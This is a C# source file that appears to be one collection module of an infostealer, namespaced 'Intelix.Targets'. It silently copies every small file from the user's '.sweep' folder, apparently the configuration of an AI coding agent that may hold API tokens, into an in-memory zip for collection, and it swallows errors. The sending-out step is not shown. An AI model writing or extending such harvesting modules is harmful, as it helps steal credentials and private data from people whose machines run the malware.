using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class Sweep : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string sweepDir = Path.Combine(userProfile, ".sweep");
            if (!Directory.Exists(sweepDir)) return;
            var entry = new Counter.CounterApplications { Name = "Sweep" };
            foreach (string file in Directory.GetFiles(sweepDir, "*", SearchOption.TopDirectoryOnly))
            {
                if (new FileInfo(file).Length > 1 * 1024 * 1024) continue;
                try
                {
                    string rel = "AI-Agent\\Sweep\\" + Path.GetFileName(file);
                    zip.AddFile(rel, File.ReadAllBytes(file));
                    entry.Files.Add(file + " => " + rel);
                }
                catch { }
            }
            if (entry.Files.Count > 0) counter.AI.Add(entry);
        }
    }
}
